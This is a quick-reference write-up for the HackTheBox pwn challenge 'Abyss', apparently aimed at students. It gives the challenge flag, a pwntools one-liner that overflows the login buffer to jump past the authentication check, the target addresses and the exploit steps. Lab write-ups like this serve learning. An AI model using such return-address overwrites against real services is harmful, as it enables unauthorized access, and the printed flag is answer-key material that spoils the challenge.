# HTB Abyss - Quick Reference Guide

## Flag
```
HTB{sH0u1D_h4v3-NU11-t3rmIn4tEd_buf!_583414af2d677036fc3ad3c419bcd882}
```

## Quick Exploit Command
```bash
python3 solution.py
```

## One-Liner Exploit (Python)
```python
from pwn import *; io = remote('83.136.255.106', 53373); io.send(p32(0)); io.send(b"USER " + b"AAAAAAAABBBBBBBBC\x1c" + b"DDDDEEEEEEE" + p32(0x4014eb)); io.send(b"PASS " + b"D" * 507); io.send(b"flag.txt"); print(io.recvall(timeout=2).decode())
```

## Key Addresses
- **Return target:** `0x4014eb` (cmd_read after auth check)
- **logged_in global:** `0x4040c0`
- **cmd_read function:** `0x4014a9`

## Vulnerability Summary
- **Type:** Stack Buffer Overflow
- **Location:** `cmd_login()` function
- **Cause:** No bounds checking in string copy loop
- **Impact:** Return address overwrite → Authentication bypass

## Exploit Flow
1. `LOGIN` command (0)
2. `USER` + crafted payload → Sets up overflow
3. `PASS` + full buffer → Triggers overflow
4. Return to `0x4014eb` → Skip auth check
5. Send "flag.txt" → Read flag
6. Receive flag

## File Structure
```
/home/kali/Downloads/HTB CTF/pwn/abyss/
├── solution.py              ← Clean, documented exploit
├── SOLUTION_COMPLETE.md     ← Full writeup for beginners
├── QUICK_REFERENCE.md       ← This file
└── challenge/
    ├── abyss                ← The binary
    ├── source.c             ← Source code
    └── flag.txt             ← Local flag for testing
```

## Testing Locally
```bash
# Start the binary (requires .creds file)
cd challenge/
./abyss

# In another terminal, test exploit
python3 ../solution.py
```

## Common Issues & Solutions

### Issue: "Could not connect"
- **Cause:** Server is down or rate-limited
- **Solution:** Wait a few minutes and retry

### Issue: "Not logged in"
- **Cause:** Wrong return address or payload corruption
- **Solution:** Verify payload bytes match exactly

### Issue: No output received
- **Cause:** Binary crashed or connection closed
- **Solution:** Check payload structure and timing

## Important Notes for BSc IT Students

### What This Teaches You
1. **Buffer overflows** - Classic vulnerability
2. **Stack layout** - How memory is organized
3. **Return addresses** - Control flow hijacking
4. **Assembly basics** - Reading disassembly
5. **Binary exploitation** - Real-world security

### Skills Practiced
- Python scripting with pwntools
- Binary analysis with objdump
- Understanding x86-64 assembly
- Stack manipulation
- Exploit development

### Career Relevance
- Penetration testing
- Security research
- Vulnerability assessment
- Reverse engineering
- Secure coding practices

## Further Learning
- **Next Steps:** Try "Regularity" (Very Easy pwn challenge)
- **Practice:** pwn.college, picoCTF
- **Books:** "Hacking: The Art of Exploitation"
- **YouTube:** LiveOverflow channel

## Exam Tips (If Applicable)
1. **Explain the vulnerability:** Loop with no bounds check
2. **Draw the stack:** Show buffer layout
3. **Show the fix:** Add bounds checking or use safe functions
4. **Security features:** Mention ASLR, stack canaries, NX

---

**Challenge:** Abyss (Easy)  
**Points:** 1000  
**Status:** ✅ SOLVED  
**Time:** ~2 hours (with learning)
